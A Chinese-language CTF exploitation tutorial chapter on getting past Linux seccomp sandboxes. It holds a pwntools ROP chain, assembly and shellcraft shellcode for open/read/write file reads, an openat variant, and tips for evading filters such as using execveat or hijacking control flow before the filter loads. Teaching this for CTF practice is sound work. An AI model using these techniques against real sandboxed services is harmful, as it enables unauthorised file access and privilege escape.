# 第 28 章 沙箱与 seccomp 绕过

> 你拿到了 shell，却发现执行 `cat flag` 被拒绝——程序上了 seccomp 沙箱，execve 被禁用了。这时，你需要用 ORW（open/read/write）直接读文件，而不是启动新进程。

---

## 28.1 什么是 seccomp

**seccomp（secure computing mode）** 是 Linux 内核的安全机制，允许进程限制自己能调用哪些系统调用。CTF 题目常用它禁用 `execve`、`system` 等危险调用，防止选手直接 getshell。

程序通常用 `prctl` 或 `seccomp` 库设置过滤规则：

```c
#include <seccomp.h>

scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);  // 默认允许
seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);  // 禁用 execve
seccomp_load(ctx);
```

设置了沙箱后，任何调用 `execve` 的尝试都会导致进程被杀死（SIGSYS 或返回 EPERM）。

## 28.2 检测沙箱

### 28.2.1 用 seccomp-tools

```bash
# 安装
sudo gem install seccomp-tools

# 分析程序中的 seccomp 规则
seccomp-tools dump ./vuln
```

输出示例：

```text
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004   ld $data
 0001: 0x15 0x01 0x00 0x0000003b   jeq $execve (0x3b)
 0002: 0x06 0x00 0x00 0x7fff0000   ret $KILL
 0003: 0x06 0x00 0x00 0x7fff0000   ret $ALLOW
```

上面显示 execve（系统调用号 59）被 KILL。

### 28.2.2 运行时判断

如果拿不到二进制文件分析，可以在获得 shell 后尝试执行一个命令（会触发 execve），如果被杀说明有沙箱；或者直接尝试 ORW 读 flag。

## 28.3 绕过思路：ORW

当 `execve` 被禁用时，我们不能直接启动 `/bin/sh`，但可以用其他系统调用读取 flag 文件：

1. **open("/flag", O_RDONLY)** — 打开 flag 文件
2. **read(fd, buf, size)** — 读取内容到内存
3. **write(1, buf, size)** — 把内容写到标准输出

这三个系统调用通常不在禁用列表里。

### 28.3.1 用 ROP 实现 ORW

```python
from pwn import *

# 需要的 gadget
pop_rdi = ...
pop_rsi = ...
pop_rdx = ...
pop_rax = ...
syscall = ...

# 找一个可写地址存放 "/flag" 字符串
flag_str_addr = elf.bss() + 0x100

rop = ROP(elf)
rop.raw(pop_rdi); rop.raw(flag_str_addr)
rop.raw(pop_rsi); rop.raw(0)               # O_RDONLY
rop.raw(pop_rdx); rop.raw(0)
rop.raw(pop_rax); rop.raw(2)               # open 的系统调用号
rop.raw(syscall)

# open 返回的文件描述符通常在 rax，但我们需要把它放到 rdi 给 read
# 需要 gadget: mov rdi, rax; ret 或者用 ret2csu

rop.raw(pop_rdi); rop.raw(3)               # 假设 fd = 3
rop.raw(pop_rsi); rop.raw(flag_str_addr + 0x100)  # 读取到的缓冲区
rop.raw(pop_rdx); rop.raw(0x100)           # 读取长度
rop.raw(pop_rax); rop.raw(0)               # read 的系统调用号
rop.raw(syscall)

rop.raw(pop_rdi); rop.raw(1)               # stdout
rop.raw(pop_rsi); rop.raw(flag_str_addr + 0x100)
rop.raw(pop_rdx); rop.raw(0x100)
rop.raw(pop_rax); rop.raw(1)               # write 的系统调用号
rop.raw(syscall)
```

### 28.3.2 用 shellcode 实现 ORW

如果能执行 shellcode（栈可执行或写入可执行内存），ORW shellcode 更简洁：

```asm
; open("/flag", 0)
push 0x67616c66        ; "flag"
mov  rbx, rsp
push rbx
mov  rdi, rsp          ; rdi = "/flag"
xor  eax, eax
mov  al, 2             ; open
xor  esi, esi
xor  edx, edx
syscall

; read(3, rsp, 0x100)
mov  rdi, rax          ; fd
mov  rsi, rsp
mov  rdx, 0x100
xor  eax, eax          ; read
syscall

; write(1, rsp, 0x100)
mov  rdi, 1
mov  rdx, rax          ; 读取的字节数
mov  eax, 1            ; write
syscall
```

用 pwntools 生成：

```python
sc = shellcraft.amd64.linux.open('flag') 
sc += shellcraft.amd64.linux.read('rax', 'rsp', 0x100)
sc += shellcraft.amd64.linux.write(1, 'rsp', 0x100)
shellcode = asm(sc)
```

## 28.4 其他绕过技巧

### 28.4.1 禁用部分系统调用

有些沙箱只禁用 execve，但允许 `openat`、`readv`、`writev` 等。可以用这些「替代调用」达到同样效果。

### 28.4.2 使用 openat 代替 open

```python
# openat(AT_FDCWD, "/flag", O_RDONLY)
# 系统调用号 257
pop_rax; 257
pop_rdi; -100           # AT_FDCWD
pop_rsi; flag_addr
pop_rdx; 0
syscall
```

### 28.4.3 用 cat /proc/self/mem 等替代

如果文件读取都被禁，可以考虑读取 `/proc/self/mem`、`/proc/self/fd/` 等特殊文件。

### 28.4.4 修改 seccomp 规则

如果能控制内存，可以尝试在沙箱设置之前劫持控制流，跳过 seccomp 的加载。

---

## 28.5 常见坑

1. **文件描述符不确定**：open 返回的 fd 不一定是 3（如果程序已经打开了其他文件）。更稳妥的做法是把 rax 保存到寄存器再用。
2. **路径字符串位置**："/flag" 字符串要放在可写的、地址已知的地方（bss 或栈上）。
3. **沙箱检查不严**：有些题目允许 `execveat` 而禁用 `execve`——尝试其他变体系统调用。

## 28.6 小结

这一章我们学了沙箱绕过：

- **seccomp** 限制系统调用，常用 `seccomp-tools dump` 检测
- **ORW**（open/read/write）是绕过 execve 禁用的标准手法
- 可以用 **ROP** 或 **shellcode** 实现 ORW
- 注意替代系统调用（openat）和文件描述符的问题
